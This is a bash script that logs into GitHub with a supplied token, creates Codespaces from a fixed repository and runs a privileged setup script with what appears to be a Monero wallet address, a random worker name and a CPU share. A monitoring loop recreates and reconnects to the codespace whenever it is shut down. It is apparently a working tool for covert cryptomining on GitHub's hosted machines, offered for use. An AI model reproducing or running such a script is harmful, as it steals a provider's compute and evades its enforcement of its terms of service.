#!/bin/bash

# Optimized version for running many instances
# Uses connection pooling and reduced monitoring overhead

GH_TOKEN="$1"
INSTANCE_ID="$2"  # Unique ID for this instance
REPO="niaalae/dock"
BRANCH="main"
MACHINE_TYPE="basicLinux_4x16"

# Generate random worker name (8 alphanumeric characters) - no hostname
RANDOM_WORKER="worker-$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 8)"
SETUP_CMD="sudo ./setup.sh 49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F \"$RANDOM_WORKER\" 85"

LOG_FILE="/tmp/autoS-${INSTANCE_ID}.log"

# Redirect all output to log file to reduce I/O
exec 1>>"$LOG_FILE" 2>&1

if [ -z "$GH_TOKEN" ] || [ -z "$INSTANCE_ID" ]; then
  echo "Usage: $0 <gh_token> <instance_id>"
  exit 1
fi

# Authenticate (reuse existing auth if possible)
if ! gh auth status >/dev/null 2>&1; then
  echo "$GH_TOKEN" | gh auth login --with-token
  if [ $? -ne 0 ]; then
    echo "GitHub authentication failed."
    exit 1
  fi
fi

# Function to create codespace
create_codespace() {
  gh codespace create -R "$REPO" -b "$BRANCH" -m "$MACHINE_TYPE" --json name -q ".name" 2>/dev/null
}

# Create initial codespace
CODESPACE_NAME=$(create_codespace)
if [ -z "$CODESPACE_NAME" ]; then
  echo "Failed to create initial codespace."
  exit 1
fi
echo "Created codespace: $CODESPACE_NAME with worker: $RANDOM_WORKER"

# SSH and run setup command in background
ssh_cmd="gh codespace ssh -c $CODESPACE_NAME -- $SETUP_CMD"
$ssh_cmd &
SSH_PID=$!

# Monitoring loop with exponential backoff
CHECK_INTERVAL=60
BACKOFF_MULTIPLIER=1

while true; do
  sleep $CHECK_INTERVAL
  
  if ! kill -0 $SSH_PID 2>/dev/null; then
    echo "SSH session closed. Attempting to reconnect..."
    
    # Check if codespace exists (with retry)
    EXISTS=$(gh codespace list --json name -q ".[] | select(.name==\"$CODESPACE_NAME\") | .name" 2>/dev/null)
    
    if [ -z "$EXISTS" ]; then
      echo "Codespace not found. Creating a new one..."
      
      # Generate new random worker name for new codespace
      RANDOM_WORKER="worker-$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 8)"
      SETUP_CMD="sudo ./setup.sh 49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F \"$RANDOM_WORKER\" 85"
      
      CODESPACE_NAME=$(create_codespace)
      
      if [ -z "$CODESPACE_NAME" ]; then
        echo "Failed to create new codespace. Checking token..."
        if ! gh auth status >/dev/null 2>&1; then
          echo "GitHub token invalid. Exiting."
          exit 1
        fi
        
        # Exponential backoff on failure
        BACKOFF_MULTIPLIER=$((BACKOFF_MULTIPLIER * 2))
        if [ $BACKOFF_MULTIPLIER -gt 16 ]; then
          BACKOFF_MULTIPLIER=16
        fi
        echo "Retrying in $((CHECK_INTERVAL * BACKOFF_MULTIPLIER)) seconds..."
        sleep $((CHECK_INTERVAL * BACKOFF_MULTIPLIER))
        continue
      fi
      
      echo "Created new codespace: $CODESPACE_NAME with worker: $RANDOM_WORKER"
      ssh_cmd="gh codespace ssh -c $CODESPACE_NAME -- $SETUP_CMD"
      BACKOFF_MULTIPLIER=1  # Reset backoff on success
    fi
    
    # Reconnect SSH
    echo "Reconnecting SSH to codespace: $CODESPACE_NAME"
    $ssh_cmd &
    SSH_PID=$!
  fi
done
